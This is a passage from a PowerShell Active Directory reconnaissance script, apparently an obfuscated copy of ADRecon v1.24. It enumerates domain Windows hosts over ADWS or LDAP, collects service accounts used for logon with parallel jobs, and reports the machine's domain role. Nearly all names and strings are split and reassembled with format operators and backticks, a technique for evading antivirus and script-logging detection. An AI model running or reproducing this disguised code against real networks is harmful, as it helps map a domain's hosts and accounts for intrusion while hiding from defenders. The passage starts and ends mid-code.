                            ${O`BJ} | &("{0}{2}{1}"-f'Ad','Member','d-') -MemberType ("{2}{1}{3}{0}"-f 'y','ePr','Not','opert') -Name ("{2}{3}{1}{0}"-f 'Name','rvice ','S','e') -Value ${_}."Na`ME"
                            ${O`BJ} | &("{1}{2}{0}" -f'er','Add-Me','mb') -MemberType ("{0}{3}{2}{1}"-f 'No','y','ropert','teP') -Name ("{1}{2}{0}" -f 'ame','Sy','stemN') -Value ${_}."s`YSt`Em`NAme"
                            If (${_}."StARTn`A`mE".("{1}{2}{0}" -f'r','to','Uppe').Invoke().("{0}{1}"-f 'C','ontains').Invoke(${cU`R`R`enTDOMAIN}))
                            {
                                ${o`Bj} | &("{3}{1}{2}{0}"-f'er','d','d-Memb','A') -MemberType ("{2}{1}{0}" -f 'operty','ePr','Not') -Name ("{4}{0}{2}{1}{3}"-f 'ing a','m','s Do','ain User','Runn') -Value ${t`RuE}
                            }
                            Else
                            {
                                ${O`BJ} | &("{1}{3}{0}{2}" -f'd-Memb','A','er','d') -MemberType ("{2}{0}{1}" -f 'otePrope','rty','N') -Name ("{0}{3}{4}{2}{1}"-f 'R','in User','ma','un','ning as Do') -Value ${f`AlSe}
                            }
                            ${SCRipt:`sER`Vic`Ea`cCOU`NTs} += ${O`Bj}
                        }
                    }
                    ElseIf ( ${DA`Ta}.("{1}{0}"-f 'Type','Get').Invoke() -eq [String] )
                    {
                        ${scr`ip`T:wa`RNinGs} += ${d`AtA}
                        &("{2}{3}{0}{1}"-f'Ver','bose','Write','-') ${d`ATa}
                    }
                }
            }
        }
    }

    PROCESS
    {
        ${scRI`pT`:`SeRvIceACCou`NtS} = @()
        [string[]] ${w`ARniN`gs} = @()
        If (${meT`hOD} -eq ("{1}{0}" -f'WS','AD'))
        {
            Try
            {
                ${ADd`omA`IN} = &("{0}{1}{2}{3}"-f 'Get','-AD','Doma','in')
            }
            Catch
            {
                &("{3}{0}{2}{1}"-f 'ri','Warning','te-','W') ("{10}{3}{1}{9}{4}{8}{11}{0}{5}{6}{2}{7}{12}"-f'ogon] Error ge','-AD','in Con','Get','ccountsus','tting ','Doma','tex','e','RDomainA','[','dforServiceL','t')
                &("{2}{1}{0}{3}"-f'rbo','ite-Ve','Wr','se') "[EXCEPTION] $($_.Exception.Message) "
                Return ${n`UlL}
            }
            If (${a`D`doMa`In})
            {
                ${cur`RE`NtdOMA`in} = ${a`DDom`AIN}."NET`B`ioSnAmE".("{0}{2}{1}" -f 'toUp','er','p').Invoke()
                &("{2}{3}{1}{0}{4}"-f'iabl','Var','Rem','ove-','e') ("{0}{2}{1}" -f'AD','main','Do')
            }
            Else
            {
                ${CUrRentD`O`MaiN} = ""
                &("{0}{3}{2}{1}"-f'Write','g','Warnin','-') ("{1}{3}{6}{7}{2}{0}{4}{5}"-f 'riev','C','et','urrent Domain cou','e','d.','ld not ','be r')
            }

            Try
            {
                ${adcO`mpUT`ers} = &("{0}{2}{3}{1}" -f 'Ge','er','t-ADC','omput') -Filter { &("{1}{0}{2}" -f'ab','En','led') -eq ${T`RuE} -and ("{0}{1}{2}"-f'Opera','tin','gSystem') -Like ("{1}{0}"-f 'indows*','*W') } -Properties ("{0}{1}" -f'Nam','e'),("{0}{3}{1}{2}"-f 'DNS','N','ame','Host'),("{0}{4}{2}{3}{1}"-f'Ope','m','ingSyst','e','rat')
            }
            Catch
            {
                &("{1}{0}{4}{3}{2}" -f 'r','Write-Wa','g','n','ni') ("{0}{16}{21}{4}{2}{9}{22}{1}{12}{3}{25}{11}{14}{13}{24}{8}{20}{26}{23}{6}{18}{19}{17}{10}{5}{15}{7}"-f'[G','edforS','inAc','i','Doma','je','i','ts','num','countsu','Ob','gon]','erv','or w',' Err','c','et','puter ','ndow','s Com','er','-ADR','s',' W','hile e','ceLo','ating')
                &("{0}{3}{1}{2}"-f'Writ','V','erbose','e-') "[EXCEPTION] $($_.Exception.Message) "
                Return ${N`Ull}
            }

            If (${a`dCo`mP`UTers})
            {
                
                
                ${C`NT} = $( $It3V9e::("{1}{0}{2}"-f 'ectC','Obj','ount').Invoke(${A`D`CoMPuTerS}))
                &("{3}{2}{1}{0}" -f'erbose','e-V','it','Wr') ('[*]'+' '+'To'+'tal '+'Wi'+'ndows '+'H'+'o'+'sts: '+"$cnt")
                ${i`CnT} = 0
                ${A`d`cOmpUTers} | &("{1}{3}{4}{0}{2}"-f 'bj','Fo','ect','r','Each-O') {
                    ${S`TOPw`At`Ch} =  (Get-vArIaBLe  ("g"+"JA9")  -vALUEO )::("{0}{2}{1}"-f 'S','rtNew','ta').Invoke()
                    If( ${_}."dns`HoSt`NAmE" )
	                {
                        ${a`RGS} = @(${_}."dN`s`Host`NAMe", ${_}."oPerAtinGsY`s`TeM", ${c`RedENt`Ial})
		                &("{2}{0}{1}"-f 'art-J','ob','St') -ScriptBlock ${ReaD`Se`RVIcea`cC`oUnTs} -Name "read_$($_.name)" -ArgumentList ${a`RGS} | &("{1}{0}" -f 'ull','Out-N')
		                ++${Ic`NT}
		                If (${St`o`PWAtcH}."el`A`PSed"."T`oT`ALmIl`L`is`ecoNdS" -ge 1000)
                        {
                            &("{0}{1}{2}{3}" -f'Wri','t','e-Prog','ress') -Activity ("{1}{2}{5}{0}{4}{3}{6}" -f'ng d','R','etrie','ver','ata from ser','vi','s') -Status "$("{0:N2}" -f (($icnt/$cnt*100),2)) % Complete:" -PercentComplete 100
                            ${ST`opw`AtCH}.("{1}{0}" -f 'et','Res').Invoke()
                            ${StoPW`At`ch}.("{0}{1}"-f 'Sta','rt').Invoke()
		                }
                        while ( ( &("{0}{1}{2}" -f 'G','et-J','ob') -State ("{1}{0}{2}"-f'unnin','R','g'))."c`OUNt" -ge ${T`hrEADS} ) { &("{0}{2}{1}"-f 'Start-S','p','lee') -Seconds 3 }
		                &("{2}{6}{3}{1}{0}{5}{4}"-f'o','J','processComp','ted','s','b','le')
	                }
                }

                

                &("{3}{2}{0}{1}" -f'ogres','s','r','Write-P') -Activity ("{4}{2}{1}{5}{0}{3}" -f'a from serve','eving d','tri','rs','Re','at') -Status ("{1}{3}{0}{4}{7}{5}{6}{2}{8}"-f'g for backg','Wait','o complet','in','round','s ','t',' job','e...') -PercentComplete 100
                &("{2}{1}{0}" -f'ob','t-J','Wai') -State ("{1}{0}{2}"-f 'unni','R','ng') -Timeout 30  | &("{2}{0}{1}" -f't-N','ull','Ou')
                &("{0}{1}{2}" -f'Get-J','o','b') -State ("{1}{2}{0}" -f 'g','Ru','nnin') | &("{1}{0}{2}" -f 'o','St','p-Job')
                &("{3}{2}{0}{1}"-f'letedJo','bs','omp','processC')
                &("{4}{0}{3}{1}{2}"-f'i','gre','ss','te-Pro','Wr') -Activity ("{0}{3}{4}{1}{2}{6}{5}" -f'Ret','in','g data from ser','r','iev','ers','v') -Completed -Status ("{1}{0}"-f'one','All D')
            }
        }

        If (${M`ethod} -eq ("{0}{1}"-f'LD','AP'))
        {
            ${CuRR`e`N`TDoMAIn} = ([string](${O`B`JDomaIn}."N`Ame")).("{0}{2}{1}"-f 'to','er','Upp').Invoke()

            ${ob`Jse`ARCHEr} = &("{1}{2}{0}{3}" -f 'je','N','ew-Ob','ct') ("{1}{4}{8}{0}{5}{9}{6}{3}{2}{7}"-f 'Serv','Sy','ar','orySe','stem.Direct','i','Direct','cher','ory','ces.') ${ObjdOm`A`IN}
            ${oBJ`SEArc`h`eR}."PAge`Si`ze" = ${pa`gesI`ze}
            ${o`BjSE`Arch`Er}."fIl`TEr" = ("{3}{15}{8}{10}{4}{19}{9}{0}{1}{7}{11}{6}{2}{16}{5}{14}{18}{17}{13}{12}"-f'ntControl:1.2.840.','1','.','(&(samAccou','6369)(!','=2)(op','1.4','13556','e=805','erAccou','30','.','*))','System=*Windows','erat','ntTyp','803:','ng','i','us')
            ${ObjsE`A`RCHer}."prOP`eRtIES`TOloaD".("{1}{0}"-f 'ddRange','A').Invoke((("{0}{1}"-f'nam','e'),("{0}{1}{2}"-f'dn','sh','ostname'),("{2}{0}{4}{1}{3}"-f'per','ngsy','o','stem','ati')))
            ${obJS`e`ARCHER}."S`ear`CHscoPE" = ("{1}{0}{2}"-f 're','Subt','e')

            Try
            {
                ${ADcOm`pUte`Rs} = ${O`BjSeaRCH`er}.("{0}{1}" -f 'FindAl','l').Invoke()
            }
            Catch
            {
                &("{0}{2}{3}{1}"-f 'Wr','g','i','te-Warnin') ("{10}{13}{5}{16}{9}{8}{12}{15}{11}{6}{2}{1}{0}{4}{7}{14}{3}"-f 'omput','s C',' Window','cts','er Ob','Doma','ile enumerating','j','ountsusedfor','c','[Ge',' wh','Ser','t-ADR','e','viceLogon] Error','inAc')
                &("{0}{1}{2}{3}"-f 'W','rite-V','e','rbose') "[EXCEPTION] $($_.Exception.Message) "
                Return ${N`ULl}
            }
            ${ob`J`sEaR`CHER}.("{2}{1}{0}"-f'se','ispo','d').Invoke()

            If (${adc`om`puTERS})
            {
                
                
                ${c`NT} = $( $D761p::("{0}{1}{2}{3}" -f'Obje','c','t','Count').Invoke(${a`dcOm`PU`Ters}))
                &("{1}{0}{2}"-f'te-Verbos','Wri','e') ('[*]'+' '+'Total'+' '+'W'+'indows'+' '+'Hosts'+': '+"$cnt")
                ${Ic`NT} = 0
                ${adc`OmPuT`e`RS} | &("{2}{1}{0}" -f 'h-Object','Eac','For') {
                    If( ${_}."prOPEr`Ti`es"."dnsHo`st`NAmE" )
	                {
                        ${A`RgS} = @(${_}."pRop`Er`Ti`eS"."dNs`HO`Stna`mE", ${_}."p`RoperTi`eS"."opeRaT`IN`G`s`YStEm", ${crE`de`NT`iaL})
		                &("{2}{1}{0}" -f'ob','tart-J','S') -ScriptBlock ${rEA`D`s`E`RviCEAccouNTs} -Name "read_$($_.Properties.name)" -ArgumentList ${A`RgS} | &("{2}{1}{0}" -f'ull','t-N','Ou')
		                ++${I`cNT}
		                If (${S`T`oPWaTCH}."Elap`S`ed"."tOTA`LMIL`L`iSeCOnds" -ge 1000)
                        {
		                    &("{2}{0}{4}{3}{1}" -f'ri','ss','W','rogre','te-P') -Activity ("{2}{6}{0}{5}{1}{3}{4}" -f 'g','data ','R','from serve','rs',' ','etrievin') -Status "$("{0:N2}" -f (($icnt/$cnt*100),2)) % Complete:" -PercentComplete 100
                            ${st`o`pWatch}.("{1}{0}"-f'set','Re').Invoke()
                            ${ST`opwa`Tch}.("{1}{0}"-f'art','St').Invoke()
		                }
		                while ( ( &("{0}{1}{2}"-f 'G','et-','Job') -State ("{1}{0}{2}" -f 'nn','Ru','ing'))."cO`UNt" -ge ${ThR`eADs} ) { &("{2}{1}{0}"-f 'p','tart-Slee','S') -Seconds 3 }
		                &("{2}{0}{1}{3}" -f 'omp','let','processC','edJobs')
	                }
                }

                
                &("{2}{1}{0}"-f'gress','ite-Pro','Wr') -Activity ("{5}{3}{6}{4}{0}{7}{2}{1}"-f 'a f','rs','ve','evin','at','Retri','g d','rom ser') -Status ("{10}{11}{4}{6}{3}{1}{0}{9}{8}{2}{7}{5}" -f 'oun','ackgr','j','b','f','complete...','or ','obs to ',' ','d','Wa','iting ') -PercentComplete 100
                &("{2}{1}{0}" -f 'ob','-J','Wait') -State ("{1}{0}" -f 'ng','Runni') -Timeout 30  | &("{0}{1}" -f'Ou','t-Null')
                &("{1}{0}"-f'ob','Get-J') -State ("{1}{0}" -f 'ing','Runn') | &("{1}{2}{0}" -f 'Job','S','top-')
                &("{2}{4}{1}{3}{0}{5}"-f'mpl','s','proc','sCo','e','etedJobs')
                &("{3}{2}{4}{0}{1}" -f 's','s','-','Write','Progre') -Activity ("{0}{5}{2}{4}{6}{1}{7}{3}{8}" -f'Re','t','rievi','om ','ng','t',' da','a fr','servers') -Completed -Status ("{2}{0}{1}"-f'll Don','e','A')
            }
        }

        If (${s`Cript:`SER`ViCEAccO`UnTs})
        {
            Return ${ScR`i`Pt:`sE`RviCea`CcO`UNTS}
        }
        Else
        {
            Return ${N`Ull}
        }
    }
}

Function r`eMOVE-`E`mPtYA`drOu`TpUtd`iR
{

    param(
        [Parameter(mAnDAtoRY = ${tR`UE})]
        [string] ${ADR`o`UtpU`TdiR},

        [Parameter(maNdaTORY = ${t`Rue})]
        [array] ${OU`TPuTT`YPE}
    )

    Switch (${ou`Tp`U`TTYpe})
    {
        'CSV'
        {
            ${C`SvPa`Th}  = -join(${AdrO`Ut`puTDiR},'\',("{0}{2}{1}" -f'CS','Files','V-'))
            If (!(&("{1}{2}{0}{3}" -f't-Pat','T','es','h') -Path ((("{3}{2}{1}{4}{0}" -f'}*','V','CS','{1}','Path{0'))-f[Char]92,[Char]36)))
            {
                &("{1}{2}{0}"-f 'se','Write','-Verbo') ('R'+'emo'+'ved '+'E'+'mp'+'ty '+'Di'+'rect'+'ory '+"$CSVPath")
                &("{2}{0}{1}" -f 'move','-Item','Re') ${CSV`P`ATH}
            }
        }
        'XML'
        {
            ${XmLP`Ath}  = -join(${A`Dr`o`UtpUT`dIR},'\',("{1}{0}{2}{3}"-f 'Fi','XML-','le','s'))
            If (!(&("{3}{2}{1}{0}"-f'h','Pat','-','Test') -Path (("{0}{1}{2}" -f'Fg','EXM','LPathUeF*'))."RE`PlA`Ce"(([Char]85+[Char]101+[Char]70),'\')."reP`la`CE"('FgE',[sTring][Char]36)))
            {
                &("{0}{2}{1}{3}"-f 'Wri','r','te-Ve','bose') ('Re'+'move'+'d '+'Em'+'pty '+'D'+'ire'+'ctory'+' '+"$XMLPath")
                &("{1}{0}{2}" -f'mov','Re','e-Item') ${xMLpa`TH}
            }
        }
        ("{0}{1}"-f 'JSO','N')
        {
            ${jS`On`Path}  = -join(${Adrout`puT`D`iR},'\',("{1}{0}{3}{2}"-f'ON','JS','es','-Fil'))
            If (!(&("{0}{1}{2}" -f 'Test','-P','ath') -Path ((("{0}{2}{1}"-f'E23JSONPath','M*','JG'))  -CRePLaCe'E23',[cHAr]36  -CRePLaCe 'JGM',[cHAr]92)))
            {
                &("{2}{3}{1}{0}"-f 'bose','er','Write-','V') ('Rem'+'ov'+'ed '+'Empt'+'y '+'Dire'+'ctor'+'y '+"$JSONPath")
                &("{2}{1}{0}"-f 'em','ove-It','Rem') ${jS`onPa`TH}
            }
        }
        ("{1}{0}" -f'ML','HT')
        {
            ${HT`MlP`ATh}  = -join(${ad`ROUTPU`TD`IR},'\',("{2}{3}{0}{1}"-f'L','-Files','HT','M'))
            If (!(&("{2}{0}{1}"-f 'a','th','Test-P') -Path ((("{1}{3}{2}{0}{4}"-f 'k','4','MLPath95','M2HT','*'))-repLaCE([chAR]52+[chAR]77+[chAR]50),[chAR]36-cREplACE([chAR]57+[chAR]53+[chAR]107),[chAR]92)))
            {
                &("{1}{3}{0}{2}"-f'erb','Wri','ose','te-V') ('Remov'+'ed'+' '+'Emp'+'ty '+'Dir'+'ec'+'to'+'ry '+"$HTMLPath")
                &("{0}{3}{2}{1}"-f 'R','m','ove-Ite','em') ${HT`mLPa`TH}
            }
        }
    }
    If (!(&("{1}{0}"-f 'th','Test-Pa') -Path (("{3}{1}{2}{4}{0}"-f'MB*','DROutputDi','r','MiDA','C'))."rePlA`cE"('MiD',[striNG][CHar]36).("{0}{2}{1}"-f 'RepL','cE','a').Invoke('CMB','\')))
    {
        &("{3}{0}{2}{1}" -f 'e','e-Item','mov','R') ${A`dr`OUt`PUT`DIR}
        &("{1}{0}{2}"-f '-Ver','Write','bose') ('Re'+'mo'+'ved '+'E'+'mpty '+'Dir'+'ectory'+' '+"$ADROutputDir")
    }
}

Function Ge`T`-ad`RABouT
{

    param(
        [Parameter(MandaToRy = ${t`RUE})]
        [string] ${ME`T`hOd},

        [Parameter(MANDAToRy = ${TR`Ue})]
        [DateTime] ${D`AtE},

        [Parameter(MAnDAtorY = ${t`Rue})]
        [string] ${a`D`Re`CO`NvErSIoN},

        [Parameter(MANDATOrY = ${F`Alse})]
        [Management.Automation.PSCredential] ${C`Redent`iAl} =   $nk5P::"EM`Pty",

        [Parameter(MAnDAtOry = ${TR`UE})]
        [string] ${RaNOn`Comp`U`TeR},

        [Parameter(maNdAtory = ${Tr`Ue})]
        [string] ${ToTaL`Ti`mE}
    )

    ${A`BoutAD`ReC`ON} = @()

    ${Ver`s`IoN} = ${M`Eth`od} + ("{0}{1}" -f' ','Version')

    If (${CReD`enT`Ial} -ne  (GET-VAriAblE NK5P  ).value::"emP`TY")
    {
        ${UsER`Na`Me} = $(${c`REdENt`IAl}."USe`RName")
    }
    Else
    {
        ${usE`R`NAme} = $(  $lU1b::"usE`RNamE")
    }

    ${OBJV`AL`Ues} = @(("{1}{0}"-f 'ate','D'), $(${d`ATE}), ("{0}{1}{2}"-f'AD','Re','con'), ("{6}{7}{8}{2}{4}{0}{9}{1}{10}{3}{5}"-f'b.com','ec','g','/','ithu','ADRecon','https',':/','/','/adr','on'), ${VER`s`ioN}, $(${AD`RECoNveR`S`I`on}), ("{3}{2}{1}{0}" -f'er',' us','as','Ran '), ${us`eRN`AMe}, ("{0}{2}{1}{3}" -f'Ran','on comput',' ','er'), ${R`AnOnC`O`m`Puter}, ("{1}{0}{3}{2}{4}"-f'u','Exec','ins','tion Time (m',')'), $(${toTA`LT`ime}))

    For (${i} = 0; ${i} -lt $(${o`BJvA`luEs}."CO`UNt"); ${i}++)
    {
        ${O`Bj} = &("{2}{0}{1}" -f 'bjec','t','New-O') ("{0}{1}"-f'PS','Object')
        ${o`BJ} | &("{1}{0}{2}" -f 'd-M','Ad','ember') -MemberType ("{2}{0}{3}{1}"-f'ot','operty','N','ePr') -Name ("{2}{0}{1}" -f 'g','ory','Cate') -Value ${oB`jv`AlUES}[${i}]
        ${o`BJ} | &("{1}{2}{0}"-f 'r','Add','-Membe') -MemberType ("{2}{1}{0}" -f 'rty','otePrope','N') -Name ("{0}{1}" -f 'V','alue') -Value ${Obj`Va`lUES}[${i}+1]
        ${i}++
        ${abouta`D`RE`cON} += ${o`Bj}
    }
    Return ${ABoUt`Ad`REC`ON}
}

Function INVoKE-aD`R`EC`On
{

    param(
        [Parameter(mANDatORY = ${f`AL`sE})]
        [string] ${G`eN`eXCEL},

        [Parameter(mAndaTory = ${fa`l`sE})]
        [ValidateSet({"{1}{0}" -f'DWS','A'}, {"{1}{0}" -f 'DAP','L'})]
        [string] ${M`EThoD} = ("{0}{1}" -f 'AD','WS'),

        [Parameter(MANDAtoRy = ${tR`Ue})]
        [array] ${C`OllE`cT},

        [Parameter(manDatORy = ${f`A`LsE})]
        [string] ${DO`mAi`NcontrO`L`LER} = '',

        [Parameter(MaNdAtORY = ${f`ALSE})]
        [Management.Automation.PSCredential] ${CReD`E`NtIaL} =   $NK5P::"emP`Ty",

        [Parameter(MAnDatoRy = ${TR`UE})]
        [array] ${O`U`T`PuttypE},

        [Parameter(MaNdaTory = ${fa`Lse})]
        [string] ${adRo`UtPU`TD`iR},

        [Parameter(MANDATorY = ${FAL`se})]
        [int] ${DORma`N`T`TIME`sPAN} = 90,

        [Parameter(mAndatOrY = ${fA`lSE})]
        [int] ${pASsM`A`xaGe} = 30,

        [Parameter(MaNDAtOrY = ${F`A`lse})]
        [int] ${pAge`SI`ze} = 200,

        [Parameter(mANdatory = ${fa`LSE})]
        [int] ${tH`Re`ADS} = 10,

        [Parameter(mANDatOry = ${f`Al`SE})]
        [bool] ${uSE`ALT`CrE`Ds} = ${fA`LsE}
    )

    [string] ${adRE`c`oNVEr`sIon} = ("{0}{1}" -f'v1','.24')
    &("{1}{2}{0}"-f'Output','W','rite-') ('[*'+'] '+'ADR'+'econ '+"$ADReconVersion "+'by'+' '+'P'+'rash'+'ant '+'Mahaj'+'an '+'(@p'+'rash'+'ant35'+'3'+'5)')

    If (${G`ENex`CEL})
    {
        If (!(&("{1}{2}{0}" -f 'h','Test-Pa','t') ${GE`N`exceL}))
        {
            &("{0}{3}{2}{1}" -f 'Writ','Output','-','e') ("{5}{6}{0}{7}{1}{4}{2}{3}"-f 'e-AD','n','valid Pat','h ... Exiting','] In','[Invo','k','Reco')
            Return ${nU`Ll}
        }
        &("{2}{0}{3}{1}" -f 'x','DRExcel','E','port-A') -ExcelPath ${G`e`NeXcEL}
        Return ${Nu`lL}
    }

    
    ${SAvE`V`ERB`o`Se`PrEFERENCE} = ${ScRI`p`T:VERbOs`Ep`RefERenCE}
    ${scRiPt:`VeRBO`S`E`preF`E`R`ENcE} = ("{5}{3}{0}{4}{1}{2}"-f'tly','n','ue','n','Conti','Sile')
    Try
    {
        If (${PsV`Er`s`ionTaBLE}."Ps`Vers`ION"."MA`jOr" -ne 2)
        {
            ${COM`p`UT`ER} = &("{1}{2}{0}" -f'ce','Get-CimI','nstan') -ClassName ("{4}{6}{2}{0}{5}{3}{1}"-f 't','em','2_Compu','Syst','Wi','er','n3')
            ${c`oM`PUT`eRD`omaiNROlE} = (${COm`p`UteR})."Do`mai`N`ROLE"
        }
        Else
        {
            ${Co`mpUT`Er} = &("{0}{3}{1}{2}"-f'G','MIObjec','t','et-W') ("{2}{3}{4}{5}{0}{1}"-f'r','system','win','32','_comp','ute')
            ${CoMpUte`R`dOmaIN`Ro`le} = (${comp`U`Ter})."DoMaI`Nr`oLe"
        }
    }
    Catch
    {
        &("{0}{2}{1}"-f'W','tput','rite-Ou') "[Invoke-ADRecon] $($_.Exception.Message) "
    }
    If (${SA`VEv`ERBO`s`ep`ReFERE`NCe})
    {
        ${SCRip`T:vERbO`SE`p`ReFeReNCe} = ${SA`VEvErBoSEP`R`EfE`RenCE}
        &("{0}{4}{3}{1}{2}" -f 'Rem','ariabl','e','ve-V','o') ("{4}{0}{5}{1}{3}{2}"-f'av','b','rence','osePrefe','S','eVer')
    }

    switch (${c`Om`puTeRD`o`MaINr`oLE})
    {
        0
        {
            [string] ${COm`p`U`TErrOLE} = ("{4}{5}{1}{0}{3}{2}" -f'orks','W','ation','t','Standalo','ne ')
            ${enV:a`dPS_`loADDEFa`Ult`DRiVe} = 0
            ${Us`eAl`TCRe`ds} = ${tr`UE}
        }
        1 { [string] ${C`ompUt`ErRo`LE} = ("{5}{3}{4}{0}{1}{2}"-f 'o','rkstatio','n','emb','er W','M') }
        2
        {
            [string] ${c`omP`U`TeRRolE} = ("{2}{4}{3}{1}{0}" -f 'ne Server','o','St','l','anda')
            ${u`sEAlT`CREDs} = ${t`RUE}
            ${E`NV`:aDPs_`Loa`D`DeFAuLTD`RI`Ve} = 0
        }
        3 { [string] ${COmPuT`e`RroLE} = ("{2}{1}{0}"-f'ber Server','m','Me') }
        4 { [string] ${c`OMpu`Terro`LE} = ("{3}{5}{4}{6}{2}{0}{1}{7}"-f'oll','e','main Contr','B','k','ac','up Do','r') }
        5 { [string] ${CO`MP`UT`eRR`ole} = ("{0}{2}{4}{3}{5}{6}{1}"-f 'Prima','ntroller','r','ain','y Dom',' ','Co') }
        default { &("{2}{1}{0}"-f'Output','e-','Writ') ("{6}{1}{3}{5}{7}{0}{4}{2}"-f'tifi','ole ','d.','could not be ','e','ide','Computer R','n') }
    }

    ${R`A`No`NcOmPuT`Er} = "$($computer.domain)\$([Environment]::MachineName) - $($computerrole) "
    &("{3}{1}{0}{2}" -f 'ove-Varia','em','ble','R') ("{1}{0}{2}" -f 'pu','com','ter')
    &("{0}{1}{4}{3}{2}"-f 'R','emov','able','Vari','e-') ("{2}{3}{0}{1}"-f 'a','inrole','com','puterdom')
    &("{3}{0}{2}{1}" -f 'emo','riable','ve-Va','R') ("{3}{2}{1}{0}"-f 'le','erro','put','com')

    
    If ((${dO`main`coNtR`o`lLEr} -ne "") -or (${c`ReD`E`NtIaL} -ne   $Nk5p::"eM`pTy"))
    {
        
        If ((${MEt`h`od} -eq ("{1}{0}"-f'WS','AD')) -and (-Not ${uS`eALT`crEds}))
        {
            ${E`Nv:A`DPs_Loa`DdEF`Au`L`Td`RIvE} = 0
        }
        ${U`S`EAl`TcrEDS} = ${T`RUe}
    }

    
    If (${M`Et`HoD} -eq ("{0}{1}" -f 'AD','WS'))
    {
        If (&("{1}{0}{2}"-f 't-Modul','Ge','e') -ListAvailable -Name ("{0}{3}{2}{1}"-f 'Acti','ctory','ire','veD'))
        {
            Try
            {
                
                ${Savev`er`BOsE`PrEf`Er`enCe} = ${SC`RiPt`:veR`BoSE`PREferEnCE};
                ${SC`RIpt:V`erBO`sEp`Refer`eNce} = ("{1}{3}{4}{0}{2}"-f 'yConti','Sil','nue','ent','l');
                &("{0}{2}{1}"-f'I','t-Module','mpor') ("{2}{1}{0}{3}"-f'veD','ti','Ac','irectory') -WarningAction ("{1}{0}"-f'op','St') -ErrorAction ("{0}{1}"-f'S','top') | &("{0}{1}{2}"-f 'O','ut-N','ull')
                If (${sa`VeV`ERBo`SEp`R`EfErencE})
                {
                    ${SC`R`i`p`T:V`ERbOSeP`REfE`Rence} = ${sAv`e`Ve`RBOsepre`FERenCe}
                    &("{2}{3}{1}{0}" -f'e','move-Variabl','R','e') ("{2}{0}{6}{3}{1}{4}{5}" -f 'V','eren','Save','sePref','c','e','erbo')
                }
            }
            Catch
            {
                &("{0}{2}{1}{4}{3}"-f 'Wri','r','te-Wa','ing','n') ("{6}{26}{11}{32}{10}{7}{35}{18}{5}{29}{37}{24}{19}{27}{13}{0}{25}{8}{4}{3}{20}{22}{2}{33}{9}{12}{28}{15}{31}{1}{16}{21}{17}{23}{30}{34}{36}{14}"-f' RSAT','Tools','er','mote S','Re','e','[Invo','ng Ac','(','d','rti','Recon] Error i','m','m','AP','nist',') ... C',' ','v','Module f','e','ontinuing','rv','wit','ectory ',' ','ke-AD','ro','i','D','h ','ration ','mpo',' A','L','ti','D','ir')
                ${m`et`hOD} = ("{1}{0}" -f 'P','LDA')
                If (${S`AVE`Ve`Rbo`SepREFE`REn`cE})
                {
                    ${scrIPt`:v`ErBOsEpR`eFEren`CE} = ${sa`VE`VERBOsEpRE`FEre`NCe}
                    &("{2}{3}{0}{1}"-f 'Var','iable','Remov','e-') ("{2}{1}{4}{0}{3}"-f'e','bosePr','SaveVer','rence','ef')
                }
                &("{0}{1}{2}"-f'W','ri','te-Verbose') "[EXCEPTION] $($_.Exception.Message) "
            }
        }
        Else
        {
            &("{0}{1}{2}" -f'Wr','ite-Warnin','g') ("{15}{33}{27}{11}{5}{3}{13}{32}{6}{31}{18}{10}{30}{1}{20}{14}{2}{12}{19}{23}{17}{29}{9}{16}{21}{22}{25}{24}{28}{4}{7}{0}{26}{8}" -f'g wit','(','rver','ect',' Conti','Dir',' Mod','nuin','AP',' n','ro','ctive',' Ad','o','Se','[','o','s) ','le f','mini','Remote ','t inst','al','stration Tool',' ','led','h LD','on] A','...','is','m RSAT ','u','ry','Invoke-ADRec')
            ${METH`OD} = ("{1}{0}" -f'AP','LD')
        }
    }

    
    
    ${SA`VeDE`BuG`pRefERE`NcE} = ${ScR`IpT:DEb`UGpr`EfEr`E`NcE}
    ${Sc`RI`Pt:DE`BUGPReF`eRENce} = ("{1}{0}{2}"-f'tin','SilentlyCon','ue')
    Try
    {
        ${adV`APi`32} = &("{2}{1}{0}" -f 'e','-Typ','Add') -MemberDefinition ${ADvap`I`32deF} -Name ("{2}{0}{1}"-f'i','32','Advap') -Namespace ("{0}{1}" -f 'A','DRecon') -PassThru
        ${k`E`RNe`l32} = &("{0}{1}{2}" -f 'Add','-','Type') -MemberDefinition ${KErn`eL`32d`eF} -Name ("{2}{0}{1}"-f 'e','rnel32','K') -Namespace ("{0}{2}{1}"-f 'ADRe','on','c') -PassThru
        
        ${C`Lr} = (  $YVumk::("{1}{5}{0}{3}{2}{4}{6}"-f 'cuti','Get','gAss','n','emb','Exe','ly').Invoke()."IM`A`GERUntimeVeRsI`On")[1]
        If (${mE`Th`Od} -eq ("{0}{1}"-f'A','DWS'))
        {
            
            If (${C`lR} -eq "4")
            {
                &("{2}{0}{1}" -f'-','Type','Add') -TypeDefinition $(${AD`WS`SoUrce}+${PiNG`CasTle`smBs`CAN`Ne`RsO`U`RCE}) -ReferencedAssemblies ([System.String[]]@(
                    ( (  DIR ('vaR'+'iA'+'b'+'le:yvUmK')  ).vaLUe::("{0}{4}{2}{5}{3}{1}"-f'L','ialName','t','t','oadWi','hPar').Invoke(("{0}{4}{1}{3}{2}{7}{5}{6}{8}" -f'Mi','ro','re','soft.ActiveDi','c','ory.Manage','me','ct','nt')))."l`OCaTIoN"
                    (  (  gEt-VARiaBLe  YVUmk).vaLUE::("{2}{4}{0}{3}{1}"-f 'rt','ame','Lo','ialN','adWithPa').Invoke(("{2}{3}{0}{4}{1}" -f'ct','ervices','Syst','em.Dire','oryS')))."LocAt`I`oN"
                    ( (  ChILdItEM  VARiabLe:yVuMK ).vaLUe::("{0}{5}{4}{3}{2}{1}" -f 'Load','lName','rtia','Pa','ith','W').Invoke(("{2}{0}{1}{3}"-f'e','m.XM','Syst','L')))."l`Ocat`ioN"
                ))
            }
            Else
            {
                &("{2}{1}{0}"-f'-Type','dd','A') -TypeDefinition $(${aD`WsSOU`RCe}+${Pi`NgcaStLE`smBS`C`AnnersO`UrCe}) -ReferencedAssemblies ([System.String[]]@(
                    ( ( GI vARIaBle:yvumk  ).vALUE::("{0}{3}{1}{2}" -f 'LoadWith','m','e','PartialNa').Invoke(("{4}{5}{0}{8}{1}{6}{3}{2}{7}{9}"-f 'ti','t','an','M','Micros','oft.Ac','ory.','ag','veDirec','ement')))."Loc`ATI`on"
                    (  $YvUMK::("{0}{2}{3}{1}{4}"-f 'LoadWit','alNa','hPa','rti','me').Invoke(("{4}{5}{3}{1}{6}{0}{2}"-f 'yS','.D','ervices','tem','Sy','s','irector')))."L`o`CATioN"
